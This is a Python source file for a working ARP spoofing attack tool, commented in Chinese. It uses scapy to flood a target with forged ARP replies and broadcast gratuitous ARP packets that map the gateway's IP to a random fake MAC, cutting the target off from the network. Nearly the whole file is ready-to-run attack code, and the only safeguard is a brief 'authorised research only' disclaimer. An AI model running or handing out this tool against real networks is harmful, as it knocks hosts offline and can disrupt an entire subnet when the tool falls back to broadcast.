#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
@Project : python
@File : arp_attack.py
@Author : moresuo
@Time : 2026/6/29
@脚本说明 : ARP 欺骗攻击（伪装网关向靶机发送大量 ARP 响应）

向靶机发送大量 ARP 响应（is-at），psrc 伪装成网关 IP、hwsrc 整个会话
使用同一个固定随机 MAC，污染靶机 ARP 缓存，使其发往网关的流量指向
无效 MAC，造成断网。仅用于授权安全研究。

注意：ARP 为二层协议，攻击机必须与靶机同网段；Windows 需 Npcap 且通常需
管理员权限发包；VMware NAT 环境网关通常是 .2（非 .1），推荐显式 -g 指定。
"""
import sys
import threading
import concurrent.futures
import warnings

from alive_progress import alive_bar
from scapy.layers.l2 import Ether, ARP, getmacbyip
from scapy.sendrecv import sendp
from scapy.volatile import RandMAC

from tools.color import console
from tools.ip_scan import resolve_iface

warnings.filterwarnings("ignore")


def _infer_gateway(target_ip):
    """推断网关 IP：取靶机同网段的 .1（常见网关地址）。"""
    parts = target_ip.split(".")
    if len(parts) == 4 and all(parts):
        return ".".join(parts[:3]) + ".1"
    return None


def _resolve_target_mac(target_ip, dev):
    """预先解析靶机 MAC（getmacbyip 失败回退广播地址）。"""
    try:
        mac = getmacbyip(target_ip)
        if mac and mac != "ff:ff:ff:ff:ff:ff":
            return mac
    except Exception:
        pass
    return "ff:ff:ff:ff:ff:ff"


def arp_attack_run(target_ip, gateway_ip=None, num=10000, iface=None, threads=None, fake_mac=None):
    """ARP 欺骗攻击入口。

    Args:
        target_ip:  靶机 IP（攻击机需与之同网段）
        gateway_ip: 伪装的网关 IP，None 时自动推断同网段 .1
        num:        发送 ARP 响应包数量（默认 10000）
        iface:      指定网卡 名称/描述/IP，None 时按靶机网段自动选择
        threads:    并发线程数，默认取 num（越高爆发力越强）
        fake_mac:   伪装网关 MAC，None 时会话内生成一个固定随机 MAC
    """
    from rich.panel import Panel

    # ── 网卡解析 ──
    dev = resolve_iface(iface, target_ip)
    if dev is None:
        console.print(
            f"[fail]✗ 无法确定发包网卡[/fail] "
            f"[dim]（靶机 {target_ip} 无同网段网卡，请用 -I/--iface 指定网卡名称/描述）[/dim]"
        )
        return

    # ── 网关 IP ──
    if not gateway_ip:
        gateway_ip = _infer_gateway(target_ip)
        if not gateway_ip:
            console.print(f"[fail]✗ 无法推断网关 IP，请用 -g/--gateway 指定[/fail]")
            return

    # ── 靶机 MAC 预解析 ──
    target_mac = _resolve_target_mac(target_ip, dev)
    if target_mac == "ff:ff:ff:ff:ff:ff":
        console.print(f"[warn]⚠ 未解析到靶机 MAC，将以广播地址发送（影响同网段所有主机）[/warn]")

    # ── 伪装 MAC：整个会话固定一个 ──
    if not fake_mac:
        fake_mac = str(RandMAC())
    real_gw_mac = _resolve_target_mac(gateway_ip, dev)

    # ── 并发数：直接取 num 做 worker（仿原始脚本线程风暴模型）──
    if not threads:
        threads = num

    console.print(Panel.fit(
        f"[accent]靶机[/accent]      [host]{target_ip}[/host] [dim]({target_mac})[/dim]\n"
        f"[accent]伪装网关[/accent]    [highlight]{gateway_ip}[/highlight]\n"
        f"[accent]真实网关MAC[/accent] [fail]{real_gw_mac}[/fail]\n"
        f"[accent]伪装MAC[/accent]    [warn]{fake_mac}[/warn] [dim](固定)[/dim]\n"
        f"[accent]网卡[/accent]      [highlight]{dev.description}[/highlight] [dim]({dev.ip})[/dim]\n"
        f"[accent]发包数[/accent]    [count]{num}[/count]\n"
        f"[accent]线程数[/accent]    [count]{threads}[/count]",
        title="[header]ARP 欺骗攻击[/header]",
        border_style="warn",
    ))

    sent = [0]
    sent_lock = threading.Lock()

    # 单播应答包（预构造，线程里只引不造）
    _unicast = Ether(src=fake_mac, dst=target_mac) / ARP(
        op="is-at", psrc=gateway_ip, pdst=target_ip,
        hwsrc=fake_mac, hwdst=target_mac,
    )
    # 广播 gratuitous ARP（psrc==pdst==网关IP）
    _gratuitous = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
        op="is-at", psrc=gateway_ip, pdst=gateway_ip,
        hwsrc=fake_mac, hwdst="ff:ff:ff:ff:ff:ff",
    )

    def _send_one(_):
        try:
            sendp(_unicast, iface=dev, verbose=0)
            sendp(_gratuitous, iface=dev, verbose=0)
            with sent_lock:
                sent[0] += 1
        except Exception:
            pass

    # 线程风暴：max_workers 直接取 threads，制造瞬时 ARP 爆发
    workers = min(threads, num)
    _tracked = [0]

    def _on_done(_fut):
        with sent_lock:
            completed = sent[0]
        delta = completed - _tracked[0]
        if delta > 0:
            _bar(delta)
            _tracked[0] = completed

    with alive_bar(
        num,
        title="ARP攻击",
        bar="smooth",
        spinner="dots_waves2",
        enrich_print=False,
        file=sys.__stderr__,
        receipt=True,
        receipt_text="ARP攻击完成",
    ) as _bar:
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
            futures = []
            for i in range(num):
                f = executor.submit(_send_one, i)
                f.add_done_callback(_on_done)
                futures.append(f)
            concurrent.futures.wait(futures)
        remaining = sent[0] - _tracked[0]
        if remaining > 0:
            _bar(remaining)

    console.print(f"[success]✓ 已发送 {sent[0]} / {num} 个 ARP 响应包[/success]")
